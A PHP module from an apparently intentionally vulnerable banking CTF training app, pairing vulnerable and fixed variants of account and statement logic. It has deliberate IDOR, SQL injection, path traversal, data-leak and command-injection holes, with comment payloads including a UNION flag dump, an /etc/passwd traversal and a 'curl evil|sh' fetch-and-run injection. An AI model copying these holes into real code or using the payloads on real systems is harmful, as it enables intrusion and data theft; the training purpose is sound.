<?php

declare(strict_types=1);

/**
 * Shared statement/account logic used by BOTH the HTML statements page and the
 * accounts JSON API, so vuln/secure behaviour lives in one place.
 *
 * Governing vulns:
 *   transfer.l1   IDOR on account_id (CWE-639) — account list/detail/statement
 *                 ownership not enforced.
 *   statements.g2 SQL injection (CWE-89)       — date-range filter concatenated.
 *   statements.g4 Reflected XSS (CWE-79)       — search term echoed unescaped
 *                 (handled at render time via vuln_out()).
 *   statements.g8 Path traversal (CWE-22)      — CSV export ?file= not sanitised.
 *   accounts.l19  Hidden API fields (CWE-213)  — internal columns leaked.
 */

if (!function_exists('stmt_list_accounts')) {

    /**
     * Ensure ctf_flags table is seeded with flag for the current user.
     * This is called on every access to ensure flag is available for g2 SQLi extraction.
     */
    function ensure_ctf_flags_seeded(PDO $pdo): void
    {
        try {
            $me = auth()->getCurrentUser();
            if (!$me) {
                return;
            }

            $uid = (int) $me['id'];
            $username = (string) ($me['customer_id'] ?? '');
            // Always generate and update the flag using proper Flags::generate()
            $flag = Flags::generate('statements.g2', $uid);
            $stmt = $pdo->prepare('REPLACE INTO ctf_flags (user_id, username, vuln_key, flag, description) VALUES (?, ?, ?, ?, ?)');
            $stmt->execute([$uid, $username, 'statements.g2', $flag, "SQL Injection flag (user {$username})"]);
        } catch (Exception $e) {
            // Silently fail if table doesn't exist or other issues
        }
    }

    /**
     * List the CURRENT USER's own accounts only (for the dropdown selector).
     * The IDOR is no longer in the dropdown listing; it's in the server-side
     * resolution of ?account=<account_number> without ownership check.
     *
     * @return list<array<string,mixed>>
     */
    function stmt_list_accounts(PDO $pdo, TrainingEngine $engine, int $currentUserId): array
    {
        $hiddenVuln = $engine->isVulnerable('accounts', 'l19');

        // @vuln-start: hidden API fields — internal columns exposed (accounts.l19)
        // @fix-start: hidden API fields — public column allow-list only (accounts.l19)
        $cols = $hiddenVuln
            ? 'a.id, a.user_id, a.account_number, a.account_type, a.balance,
               a.daily_limit, a.is_active, a.created_at, u.role AS owner_role,
               u.email AS owner_email'
            : 'a.id, a.account_number, a.account_type, a.balance';
        // @vuln-end
        // @fix-end

        // Always show only the current user's accounts in the dropdown.
        $sql = "SELECT $cols FROM accounts a JOIN users u ON u.id = a.user_id
                 WHERE a.user_id = :uid ORDER BY a.id";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([':uid' => $currentUserId]);
        return $stmt->fetchAll();
    }

    /**
     * Fetch one account by ACCOUNT NUMBER (not numeric id).
     *
     * IDOR (transfer.l1): at vuln levels the ownership check is skipped — any
     * valid account_number resolves regardless of who owns it. The participant
     * discovers other account numbers from their beneficiaries list, then
     * changes the ?account= URL parameter to view someone else's statement.
     *
     * @return array<string,mixed>|null
     */
    function stmt_get_account_by_number(PDO $pdo, TrainingEngine $engine, int $currentUserId, string $accountNumber): ?array
    {
        $idorVuln   = $engine->isVulnerable('statements', 'l1');
        $hiddenVuln = $engine->isVulnerable('accounts', 'l19');

        $cols = $hiddenVuln
            ? 'a.id, a.user_id, a.account_number, a.account_type, a.balance,
               a.daily_limit, a.is_active, a.created_at,
               u.role AS owner_role, u.email AS owner_email, u.pan AS owner_pan'
            : 'a.id, a.user_id, a.account_number, a.account_type, a.balance';

        if ($idorVuln) {
            // @vuln-start: IDOR — account resolved by number without ownership check (statements.l1)
            $stmt = $pdo->prepare("SELECT $cols FROM accounts a JOIN users u ON u.id = a.user_id WHERE a.account_number = :acct");
            $stmt->execute([':acct' => $accountNumber]);
            // @vuln-end
        } else {
            // @fix-start: account resolved by number WITH ownership check (statements.l1)
            $stmt = $pdo->prepare("SELECT $cols FROM accounts a JOIN users u ON u.id = a.user_id WHERE a.account_number = :acct AND a.user_id = :uid");
            $stmt->execute([':acct' => $accountNumber, ':uid' => $currentUserId]);
            // @fix-end
        }
        $row = $stmt->fetch();
        if ($row && flags_delivered()) {
            $row['ctf_flag'] = Flags::generate('transfer.l1', (int) $row['user_id']);
        }
        return $row ?: null;
    }

    /**
     * Fetch one account by id. IDOR (transfer.l1): at vuln levels any id works;
     * at the secure level the account must belong to the current user.
     *
     * @return array<string,mixed>|null
     */
    function stmt_get_account(PDO $pdo, TrainingEngine $engine, int $currentUserId, int $accountId): ?array
    {
        $idorVuln   = $engine->isVulnerable('transfer', 'l1');
        $hiddenVuln = $engine->isVulnerable('accounts', 'l19');

        $cols = $hiddenVuln
            ? 'a.id, a.user_id, a.account_number, a.account_type, a.balance,
               a.daily_limit, a.is_active, a.created_at,
               u.role AS owner_role, u.email AS owner_email, u.pan AS owner_pan'
            : 'a.id, a.user_id, a.account_number, a.account_type, a.balance';

        if ($idorVuln) {
            $stmt = $pdo->prepare("SELECT $cols FROM accounts a JOIN users u ON u.id = a.user_id WHERE a.id = :id");
            $stmt->execute([':id' => $accountId]);
        } else {
            $stmt = $pdo->prepare("SELECT $cols FROM accounts a JOIN users u ON u.id = a.user_id WHERE a.id = :id AND a.user_id = :uid");
            $stmt->execute([':id' => $accountId, ':uid' => $currentUserId]);
        }
        $row = $stmt->fetch();
        if ($row && flags_delivered()) {
            $row['ctf_flag'] = Flags::generate('transfer.l1', (int) $row['user_id']);
        }
        return $row ?: null;
    }

    /**
     * Fetch transactions for an account with an optional date range + search.
     *
     * statements.g2 SQLi: ONLY the remarks search term is injectable — the date
     * range is always bound. g2_term() applies the per-level filtering, so the
     * same search box teaches three techniques:
     *   level 0: raw   -> in-band UNION or error-based, e.g.
     *            %' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags --
     *            (flag in the Remarks cell; the Date cell truncates to 10 chars)
     *   level 1: leaky blacklist -> the UNION dump after bypassing the filter
     *   level 2: UNION stripped + errors hidden -> boolean-blind, one char at a time
     *
     * @return array{rows:list<array<string,mixed>>,error:?string,sql:string}
     */
    function stmt_transactions(PDO $pdo, TrainingEngine $engine, int $accountId, string $from, string $to, string $q): array
    {
        $level = $engine->getVulnLevel('statements', 'g2');

        if (!g2_is_secure()) {
            // The date range is always bound — only the search box is injectable.
            $sql = "SELECT created_at, remarks, mode, status, amount, from_account_id, to_account_id
                      FROM transactions
                     WHERE (from_account_id = :a1 OR to_account_id = :a2)";
            $bind = [':a1' => $accountId, ':a2' => $accountId];
            if ($from !== '') {
                $sql .= ' AND created_at >= :from';
                $bind[':from'] = $from;
            }
            if ($to !== '') {
                $sql .= ' AND created_at <= :to';
                $bind[':to'] = $to;
            }
            if ($q !== '') {
                // @vuln-start: [L0-2] the search term is concatenated into the LIKE clause (statements.g2)
                // g2_term() filters the term per level, but the result is spliced straight
                // into the query, so a crafted term becomes SQL instead of just matched text.
                $qq = g2_term($q);
                $sql .= " AND remarks LIKE '%$qq%'";
                // @vuln-end
            }
            $sql .= ' ORDER BY created_at DESC';
            try {
                $stmt = $pdo->prepare($sql);
                $stmt->execute($bind);
                return ['rows' => $stmt->fetchAll(), 'error' => null, 'sql' => $sql];
            } catch (PDOException $e) {
                // @vuln-start: [L0] raw DB error returned to the client (statements.g2)
                // A broken query leaks schema and powers error-based extraction. At L1/L2
                // only a generic message shows — no error oracle — which forces boolean-blind.
                $err = $level === 0 ? $e->getMessage() : 'Query failed.';
                // @vuln-end
                return ['rows' => [], 'error' => $err, 'sql' => $sql];
            }
        }

        // @fix-start: SQLi in statement filter — fully parameterized (statements.g2)
        $sql = 'SELECT created_at, remarks, mode, status, amount, from_account_id, to_account_id
                  FROM transactions
                 WHERE (from_account_id = :a1 OR to_account_id = :a2)';
        $bind = [':a1' => $accountId, ':a2' => $accountId];
        if ($from !== '') {
            $sql .= ' AND created_at >= :from';
            $bind[':from'] = $from;
        }
        if ($to !== '') {
            $sql .= ' AND created_at <= :to';
            $bind[':to'] = $to;
        }
        if ($q !== '') {
            $sql .= ' AND remarks LIKE :q';
            $bind[':q'] = '%' . $q . '%';
        }
        $sql .= ' ORDER BY created_at DESC';
        $stmt = $pdo->prepare($sql);
        $stmt->execute($bind);
        return ['rows' => $stmt->fetchAll(), 'error' => null, 'sql' => $sql];
        // @fix-end
    }

    /**
     * Resolve the file to stream for CSV export.
     *
     * statements.g8 Path traversal: at vuln levels a ?file= parameter is read
     * from disk with NO sanitisation, so ?file=../../../../etc/passwd escapes
     * the export directory. At the secure level we basename() it and confine to
     * the whitelisted export directory.
     *
     * @return array{mode:string,path:?string,name:string}
     *         mode = 'file' (stream this path) | 'generate' (build from txns)
     */
    function stmt_export_target(TrainingEngine $engine, string $file): array
    {
        $exportDir = __DIR__ . '/../../exports';

        if ($file === '') {
            return ['mode' => 'generate', 'path' => null, 'name' => 'statement.csv'];
        }

        if ($engine->isVulnerable('statements', 'g8')) {
            // @vuln-start: path traversal — raw ?file= concatenation (statements.g8)
            return ['mode' => 'file', 'path' => $exportDir . '/' . $file, 'name' => basename($file)];
            // @vuln-end
        }

        // @fix-start: path traversal — basename() + confine to export dir + .csv (statements.g8)
        $safe = basename($file);
        if (!preg_match('/\.csv$/i', $safe)) {
            $safe .= '.csv';
        }
        return ['mode' => 'file', 'path' => $exportDir . '/' . $safe, 'name' => $safe];
        // @fix-end
    }

    /**
     * Build a CSV string from transaction rows.
     *
     * @param list<array<string,mixed>> $rows
     */
    function stmt_rows_to_csv(array $rows): string
    {
        $out = "Date,Description,Mode,Status,Amount\n";
        foreach ($rows as $r) {
            $line = [
                substr((string) $r['created_at'], 0, 10),
                str_replace([',', "\n", "\r"], ' ', (string) ($r['remarks'] ?? '')),
                (string) $r['mode'],
                (string) $r['status'],
                number_format((float) $r['amount'], 2, '.', ''),
            ];
            $out .= implode(',', $line) . "\n";
        }
        return $out;
    }

    /**
     * Generate a PDF statement by shelling out to a converter.
     *
     * statements.g9 Command injection (CWE-78): at vuln levels the user-supplied
     * output filename is concatenated into an exec() command line with no
     * escaping, so shell metacharacters in the filename run as commands:
     *
     *     ?filename=stmt.pdf;id;          -> runs `id`
     *     ?filename=x.pdf;curl evil|sh;   -> arbitrary RCE
     *
     * (wkhtmltopdf may not be installed — irrelevant: the injected command runs
     * before/around it regardless. We capture combined output so the injected
     * command's result is visible, which is how a learner confirms the exploit.)
     *
     * Level 3: escapeshellarg() around every user value.
     *
     * @return array{ok:bool,cmd:string,output:string}
     */
    function stmt_export_pdf(TrainingEngine $engine, string $filename, string $html): array
    {
        $tmpDir = sys_get_temp_dir();
        $src = $tmpDir . DIRECTORY_SEPARATOR . bin2hex(random_bytes(4)) . '.html';
        @file_put_contents($src, $html);

        // CTF (statements.g9): write per-user flag file for RCE discovery.
        // Uses {tmpDir}/flag_g9_{userId}.txt so concurrent users don't race.
        $user = auth()->getCurrentUser();
        $userId = $user ? (int) $user['id'] : 33;
        $flagFile = null;
        if ($user && $engine->isVulnerable('statements', 'g9')) {
            $flagFile = $tmpDir . DIRECTORY_SEPARATOR . "flag_g9_{$userId}.txt";
            @file_put_contents($flagFile, Flags::generate('statements.g9', $userId) . "\n");
        }

        if ($engine->isVulnerable('statements', 'g9')) {
            // @vuln-start: command injection — unescaped filename in exec() (statements.g9)
            $cmd = "wkhtmltopdf $src {$tmpDir}" . DIRECTORY_SEPARATOR . "$filename 2>&1";
            // @vuln-end
        } else {
            // @fix-start: command injection — escapeshellarg() on all inputs (statements.g9)
            $safe = $tmpDir . DIRECTORY_SEPARATOR . preg_replace('/[^A-Za-z0-9._-]/', '', basename($filename));
            $cmd  = 'wkhtmltopdf ' . escapeshellarg($src) . ' ' . escapeshellarg($safe) . ' 2>&1';
            // @fix-end
        }

        if ($engine->isVulnerable('statements', 'g9')) {
            // Sandboxed execution: fake shell interprets commands within /tmp only.
            // The exploit still works (cat /tmp/flag_g9_{userId}.txt) but cannot
            // access source files, env secrets, or other users' flag files.
            $sandbox = new Sandbox(null, $userId);
            $output  = $sandbox->exec($cmd);
        } else {
            $output = (string) shell_exec($cmd);
        }

        // Clean up: remove flag file after execution (ephemeral lifecycle)
        if ($flagFile !== null) {
            @unlink($flagFile);
        }
        @unlink($src);
        return ['ok' => true, 'cmd' => $cmd, 'output' => $output];
    }
}
